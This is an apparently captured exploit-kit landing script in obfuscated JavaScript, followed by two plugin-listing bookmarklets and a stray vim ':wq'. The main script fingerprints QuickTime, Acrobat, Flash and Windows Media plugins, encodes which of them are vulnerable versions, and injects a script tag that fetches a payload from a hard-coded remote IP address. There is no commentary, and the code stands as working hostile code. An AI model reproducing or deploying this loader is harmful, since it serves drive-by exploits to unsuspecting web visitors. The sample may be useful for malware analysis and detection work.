
if (!document.QuRNBcnt) {

var n7GEZvVr	= '0';
var q4fs1uxK	= '00';
var t7Y9lAlP	= '00';
var DBA58PTF	= '00';

try {
	for (var I4EZfpcS=0;I4EZfpcS<navigator.plugins.length;I4EZfpcS++) {
		var CRIo3_4q = navigator.plugins[I4EZfpcS].name;
		
		if (n7GEZvVr == 0 && CRIo3_4q.indexOf("QuickTime") != -1) {
			var ARq2nMlp = parseInt(CRIo3_4q.replace(/\D/g,''));

			if (ARq2nMlp > 0) {
				n7GEZvVr = ARq2nMlp.toString(16);				
			}
		}

		if (q4fs1uxK == '00' && CRIo3_4q.indexOf("Adobe Acrobat") != -1) {
			CRIo3_4q = navigator.plugins[I4EZfpcS].description;

			if (CRIo3_4q.indexOf(" 5") != -1) {
				q4fs1uxK = '05';
			} else if (CRIo3_4q.indexOf(" 6") != -1) {
				q4fs1uxK = '06';
			} else if (CRIo3_4q.indexOf(" 7") != -1) {
				q4fs1uxK = '07';
			} else {
				q4fs1uxK = '01';
			}
		}

		if (t7Y9lAlP == '00' && CRIo3_4q.indexOf("Shockwave Flash") != -1) {
			var T3pOsKTR = '';
			CRIo3_4q = navigator.plugins[I4EZfpcS].description;

			for(var DUHujTAi = 0; DUHujTAi < CRIo3_4q.length; DUHujTAi++) {
				var PleN94Bu = CRIo3_4q.charAt(DUHujTAi);

				if (!isNaN(parseInt(PleN94Bu)) || (PleN94Bu == '.' && T3pOsKTR.length > 0)) {
					T3pOsKTR += PleN94Bu;
				} else if (T3pOsKTR.length > 0) {
					break;
				}
			}

			var apYmcIuI = T3pOsKTR.split('.');

			if (apYmcIuI[0] < 9) {
				t7Y9lAlP = '7c';
			} else if (apYmcIuI[0] == 9 && apYmcIuI[1] == 0 && apYmcIuI[2] < 115 ) {
				t7Y9lAlP = '73';
			}
		}

		if (q4fs1uxK != 0 && n7GEZvVr != 0 && t7Y9lAlP != 0) {
			break;
		}
	}
} catch(e) { }

try {
	if (navigator.mimeTypes["video/x-ms-wmv"].enabledPlugin)
		DBA58PTF = '01';
} catch(e) { }

while(n7GEZvVr.length < 8)
	n7GEZvVr = '0' + n7GEZvVr;


var dUupPxfg = document.createElement("script");
dUupPxfg.setAttribute("type", "text/javascript");
dUupPxfg.setAttribute("src", "http://207.10.234.217/cgi-bin/index.cgi?d4b3c778076f012000e01ef8160200000000029c380eccff00" + n7GEZvVr + DBA58PTF + q4fs1uxK + t7Y9lAlP);

document.body.appendChild(dUupPxfg);
}

javascript:var q=''; for(var i=0;i<navigator.plugins.length;i++) {var n=navigator.plugins[i].name; q = q + '|' + n.replace(/\D/g,''); } q
javascript:var q=''; for(var i=0;i<navigator.plugins.length;i++) {var n=navigator.plugins[i].description; q = q + '|' + n; } q
:wq

